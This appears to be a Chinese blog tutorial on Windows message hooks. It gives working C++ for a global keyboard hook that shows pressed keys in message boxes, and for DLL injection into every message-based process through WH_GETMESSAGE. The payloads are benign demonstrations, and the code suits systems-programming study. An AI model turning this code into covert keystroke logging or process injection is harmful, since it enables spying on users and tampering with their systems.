    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="钩子原理"><a href="#钩子原理" class="headerlink" title="钩子原理"></a>钩子原理</h1><p>​    Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。</p><p>​    钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。</p><p>​    安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。</p><h1 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h1><p>钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序</p><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK HookProc  <span class="comment">//所有的钩子函数都是这种形式</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">int</span> nCode,</span><br><span class="line">  WPARAM wParam,</span><br><span class="line">  LPARAM lParam,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。</p><p>参数wParam和<em>lParam</em>的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。</p><h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h2><p>返回一个钩子句柄</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HOOKPROC lpfn,<span class="comment">//回调函数，名称任意，参数和返回值数据固定</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HINSTANCE hMod,<span class="comment">//为DllMain第一个参数g_Inst=(HMODULE)hModule;</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwThreadId<span class="comment">//全局钩子设置0</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。</p><p>hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL</p><p>dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。</p><p>idHook:钩子的类型</p><p><img src="Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0.assets/20191231092715762.png" alt="img"></p><h2 id="UnhookWindowsEx"><a href="#UnhookWindowsEx" class="headerlink" title="UnhookWindowsEx"></a>UnhookWindowsEx</h2><p>移除先前用SetWindowsHookEx安装的钩子，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK hhk            <span class="comment">//钩子句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递</p><h2 id="CallNextHookEx"><a href="#CallNextHookEx" class="headerlink" title="CallNextHookEx"></a>CallNextHookEx</h2><p>使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK  hhk,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>    nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="GetKeyNameText"><a href="#GetKeyNameText" class="headerlink" title="GetKeyNameText"></a>GetKeyNameText</h2><p>GetKeyNameText函数检索表示键的名称的字符串。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetKeyNameTextA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG  lParam,<span class="comment">//钩子函数的第三个参数lparam</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR lpString,<span class="comment">//接收的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   cchSize<span class="comment">//最大大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="键盘钩子实例"><a href="#键盘钩子实例" class="headerlink" title="键盘钩子实例"></a>键盘钩子实例</h1><p>功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。</p><p>首先新建DLL文件，定义两个导出函数和两个全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义导出函数，开始hook和结束hook</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_Inst = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写钩子函数</span></span><br><span class="line"><span class="comment">//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子</span></span><br><span class="line"><span class="comment">//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递</span></span><br><span class="line"><span class="comment">//对钩子进行拦截</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> code,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。</span></span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本</span></span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION &amp;&amp; lParam &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        TCHAR szBuf[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        GetKeyNameText(lParam, szBuf, MAXBYTE);</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, szBuf, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Inst = (HMODULE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MFCKeyboardHookDlg.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHook.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHookDlg.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;KeyboardHook&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> new DEBUG_NEW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 对话框</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">: CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent)</span><br><span class="line">&#123;</span><br><span class="line">m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialog::DoDataExchange(pDX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog)</span><br><span class="line">ON_WM_PAINT()</span><br><span class="line">ON_WM_QUERYDRAGICON()</span><br><span class="line">ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2)</span><br><span class="line">ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 消息处理程序</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMFCKeyboardHookDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialog::OnInitDialog();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line">SetIcon(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line">SetIcon(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果向对话框添加最小化按钮，则需要下面的代码</span></span><br><span class="line"><span class="comment">//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，</span></span><br><span class="line"><span class="comment">//  这将由框架自动完成。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnPaint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (IsIconic())</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">CPaintDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>; <span class="comment">// 用于绘制的设备上下文</span></span><br><span class="line"></span><br><span class="line">SendMessage(WM_ICONERASEBKGND, <span class="keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使图标在工作区矩形中居中</span></span><br><span class="line"><span class="keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class="line"><span class="keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class="line">CRect rect;</span><br><span class="line">GetClientRect(&amp;rect);</span><br><span class="line"><span class="keyword">int</span> x = (rect.Width() - cxIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> y = (rect.Height() - cyIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘制图标</span></span><br><span class="line">dc.DrawIcon(x, y, m_hIcon);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">CDialog::OnPaint();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当用户拖动最小化窗口时系统调用此函数取得光标</span></span><br><span class="line"><span class="comment">//显示。</span></span><br><span class="line"><span class="function">HCURSOR <span class="title">CMFCKeyboardHookDlg::OnQueryDragIcon</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;HCURSOR&gt;(m_hIcon);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">SetHookOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">SetHookOff();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="全局钩子DLL注入"><a href="#全局钩子DLL注入" class="headerlink" title="全局钩子DLL注入"></a>全局钩子DLL注入</h1><p>WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。</p><p>利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;    <span class="comment">//必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中</span></span><br><span class="line">                        <span class="comment">//而不是放在shared中,从而导致多个进程之间的共享行为失败</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInst;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMessageProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Hooked&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_ICONWARNING | MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        g_hInst = hModule;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Inline Hook(内联钩子)</title>
    <link href="/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"/>
    <url>/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/</url>
    
